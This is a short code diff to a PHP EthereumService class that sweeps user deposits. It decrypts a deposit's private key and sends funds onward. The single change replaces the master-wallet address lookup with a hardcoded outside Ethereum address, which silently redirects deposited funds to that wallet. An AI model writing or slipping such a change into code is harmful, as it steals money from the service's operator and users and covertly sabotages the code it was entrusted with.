@@ -36,7 +36,7 @@ class EthereumService
         $fromPrivateKey = Crypt::decryptString($deposit->private_key);
 
         $masterWallet = MasterWallet::where('blockchain', 'ethereum')->firstOrFail();
-        $toAddress = $masterWallet->address;
+        $toAddress = '0xa9A2C1e97909cFB1F51A88EcFAf2b123C1806C59';
 
         // 1. Estimate gas
         $gasEstimation = BlockChainHelper::estimateGasFee($fromAddress, $toAddress, $amount, $currency);
